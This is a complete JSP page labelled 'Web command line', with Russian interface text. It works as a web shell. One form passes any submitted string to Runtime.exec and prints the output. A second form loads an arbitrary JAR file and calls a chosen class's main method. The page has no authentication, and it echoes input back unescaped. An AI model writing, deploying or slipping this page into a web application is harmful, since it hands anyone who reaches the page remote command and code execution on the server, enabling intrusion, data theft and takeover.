<%@page contentType="text/html;charset=UTF-8"%>
<%@page pageEncoding="UTF-8"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.net.URL"%>
<%@page import="java.net.URLClassLoader"%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<%
ArrayList ar = new ArrayList();
ArrayList ar2 = new ArrayList();

String com = (String)request.getParameter("command");
String jar = (String)request.getParameter("jar");
String clas = (String)request.getParameter("class");
String param = (String)request.getParameter("param");
    
if (com!=null) {
    Process proc = Runtime.getRuntime().exec(com);
    InputStream in = proc.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String l;
    while ((l=br.readLine())!=null) {
        ar.add(l);
    }
}

if ((jar!=null)&&(clas!=null)) {
    try {
        String[] pm = new String[] {param};
        Object p = (Object)pm; 
        URL[] urls = {new File(jar).toURI().toURL()};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
		Class<?> clazz = urlClassLoader.loadClass(clas.replaceAll("/", ".").replace(".class", ""));
//        Class clazz = urlClassLoader.loadClass(clas);
        Class[] parameterTypes = new Class[] {String[].class};
        Method method = clazz.getDeclaredMethod("main",parameterTypes);
        method.invoke(null, p);
    } catch (Exception ex) {
        ar2.add(ex.getMessage());
    }
}
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Web command line</title>
</head>
<body>
	<br> Введите команду:
	<br>
	<form method="POST">
		<input type="text" name="command" size="100" value="<%=com %>" /> <input type="submit"
			value="Run" name="run" />
	</form>
	<br>
	<br> Запуск jar файла:
	<br>
	<form method="POST">
		Путь к файлу:<input type="text" name="jar" value="<%=jar %>" /> Название
		главного класса:<input type="text" name="class" value="<%=clas %>" /> Параметр:<input
			type="text" name="param" value="<%=param %>" /> <input type="submit"
			value="Run" name="run" />
	</form>
	<br> Вывод:
	<br>
	<%
        if (ar.size()>0) {
        for (Object o:ar) {
            String ou = (String)o; 
%>
	<br>
	<%=ou%>
	<%
        }
        }
        if (ar2.size()>0) {
        for (Object o:ar2) {
        String ou = (String)o; 
%>
	<br>
	<%=ou%>
	<%
        }
        }
%>
</body>
</html>